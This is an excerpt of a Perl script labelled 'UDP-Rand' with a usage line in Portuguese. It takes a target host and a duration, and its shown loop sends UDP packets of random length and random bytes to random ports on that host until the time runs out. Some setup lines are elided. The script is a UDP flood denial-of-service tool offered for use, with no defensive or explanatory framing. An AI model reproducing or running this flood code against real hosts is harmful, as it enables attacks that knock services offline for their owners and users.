...
use strict;
if ($#ARGV != 1) {
print "UDP-Rand Parametros -> Host Time";
exit(1);
}
my ($ip,$length) = @ARGV;
my ($iaddr,$endtime,$hex);
...
for (;time() <= $endtime;) 
{
 send(flood, pack("a" .int(rand(1024-64)+64),$hex[rand @hex] . $hex[rand @hex] . $hex[rand @hex]. $hex[rand @hex] . $hex[rand @hex]), 0, pack_sockaddr_in(int(rand(65535)), $iaddr));
};